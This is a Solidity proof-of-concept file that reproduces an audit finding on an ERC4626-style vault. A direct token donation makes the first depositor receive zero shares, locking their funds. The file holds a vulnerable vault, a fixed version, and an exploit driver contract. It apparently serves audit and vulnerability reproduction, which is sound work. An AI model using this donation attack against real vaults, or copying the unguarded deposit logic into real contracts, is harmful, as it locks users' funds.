// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of ManifestFinance finding 62715:
// "[C-01] First Deposit Can Result in Zero Shares Due to Direct Token Transfer".
//
// StakedUSH (sUSH) is an ERC4626-style vault over USH. It prices a deposit with
// the OpenZeppelin virtual-share formula (audited `_decimalsOffset()` = 0):
//
//     shares = assets * (totalSupply + 10**decimalsOffset) / (totalAssets + 1)
//
// where `totalAssets()` reads the vault's live USH balance. Because the vault
// mints WITHOUT a `require(shares > 0)` guard, an attacker who directly transfers
// USH into the empty vault (bypassing deposit()) inflates `totalAssets()` while
// `totalSupply` stays 0. The next (first) real depositor of `assets` USH then
// gets `assets * 1 / (donation + 1)` shares, which floors to 0 when the donation
// is >= the deposit. The depositor's USH is still pulled in — they receive 0
// shares for a positive deposit and their funds are locked in the vault.
//
// ManifestFinance StakedUSH is a private Kann-audit target with no public repo;
// the vulnerable pricing formula is transcribed verbatim in the finding body.
// This file reproduces that formula faithfully (OZ virtual-share semantics, the
// audited decimalsOffset = 0) and drives the exact donation → zero-shares path.
// Harm = fund lock: 100 USH pulled from the first depositor, 0 shares minted.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math.mulDiv (floor division).
library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a * b / c;
    }
}

/// @dev Minimal ERC20 double standing in for the opaque USH token. USH itself is
///      not the vulnerable boundary — the vault's share pricing is.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault (verbatim buggy share pricing inlined from the finding).
// ─────────────────────────────────────────────────────────────────────────────
contract StakedUSH {
    IERC20Min public immutable ush;

    // sUSH share accounting.
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    // Audited `_decimalsOffset()` return value = 0 (OZ virtual-share offset).
    uint256 internal constant decimalsOffset = 0;

    constructor(address _ush) {
        ush = IERC20Min(_ush);
    }

    /// @notice OZ ERC4626 default: total assets = the vault's live asset balance,
    ///         so a direct token transfer inflates it without minting shares.
    function totalAssets() public view returns (uint256) {
        return ush.balanceOf(address(this));
    }

    function _convertToShares(uint256 assets) internal view returns (uint256 shares) {
        shares = Math.mulDiv(assets, totalSupply + 10 ** decimalsOffset, totalAssets() + 1); // @> shares = assets*(totalSupply+decimalsOffset)/(totalAssets+1): a direct USH transfer inflates totalAssets() so the first depositor floors to 0 shares
    }

    /// @notice Deposit `assets` USH and mint sUSH to `receiver`.
    /// @dev BUG: no `require(shares > 0)` — a zero-share deposit still pulls the
    ///      assets in, locking the depositor's funds. Shares are priced on the
    ///      PRE-transfer balance (OZ previewDeposit semantics), so an attacker's
    ///      prior direct transfer floors the first depositor's shares to 0.
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = _convertToShares(assets);
        ush.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED vault: the same pricing, plus the min-shares guard the team added. A
// donation-poisoned deposit now REVERTS instead of silently locking funds.
// ─────────────────────────────────────────────────────────────────────────────
contract StakedUSHFixed {
    IERC20Min public immutable ush;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    uint256 internal constant decimalsOffset = 0;

    error ZeroShares();

    constructor(address _ush) {
        ush = IERC20Min(_ush);
    }

    function totalAssets() public view returns (uint256) {
        return ush.balanceOf(address(this));
    }

    function _convertToShares(uint256 assets) internal view returns (uint256 shares) {
        shares = Math.mulDiv(assets, totalSupply + 10 ** decimalsOffset, totalAssets() + 1);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = _convertToShares(assets);
        if (shares == 0) revert ZeroShares(); // FIX: reject zero-share deposits.
        ush.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: attacker donates USH into the empty vault, then the first
// real depositor gets 0 shares for a positive USH deposit — funds locked. The
// locked magnitude is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant DONATION = 100 ether; // attacker's direct transfer
    uint256 internal constant DEPOSIT = 100 ether;  // victim's first deposit

    // Exposed results.
    address public vaultAddr;
    address public ushAddr;
    address public markerAddr;
    uint256 public victimShares;
    uint256 public victimDeposited;
    uint256 public lockedUsh;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        // --- deploy USH, the vulnerable vault, and the marker (marker LAST) ---
        MiniToken ush = new MiniToken("USH", "USH");                  // nonce 1
        StakedUSH vault = new StakedUSH(address(ush));                // nonce 2
        MiniToken marker = new MiniToken("Locked USH", "LOCKED-USH"); // nonce 3 (LAST)

        vaultAddr = address(vault);
        ushAddr = address(ush);
        markerAddr = address(marker);

        // --- ATTACKER: direct transfer of USH into the empty vault ---
        // Bypasses deposit(): totalAssets() -> DONATION while totalSupply stays 0.
        // (Routed through this contract; a raw ERC20 transfer mints no shares.)
        ush.mint(address(this), DONATION);
        ush.transfer(address(vault), DONATION);

        // --- VICTIM: the first real deposit is now priced to 0 shares ---
        // shares = 100e18 * (0 + 1) / (100e18 + 1) = 0  (floored by the donation).
        ush.mint(address(this), DEPOSIT);
        ush.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT, VICTIM);

        // --- read the harm off the real vault state ---
        victimShares = vault.balanceOf(VICTIM);   // 0 shares for a positive deposit
        victimDeposited = DEPOSIT;                 // 100e18 pulled from the victim
        lockedUsh = DEPOSIT;                        // stuck in the vault, unredeemable

        // Harm holds: a positive deposit minted zero shares -> funds locked.
        require(victimShares == 0, "expected zero shares");
        require(ush.balanceOf(address(vault)) == DONATION + DEPOSIT, "deposit not pulled");

        // --- record the locked magnitude on the marker, minted to the SINK ---
        marker.mint(SINK, DEPOSIT);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
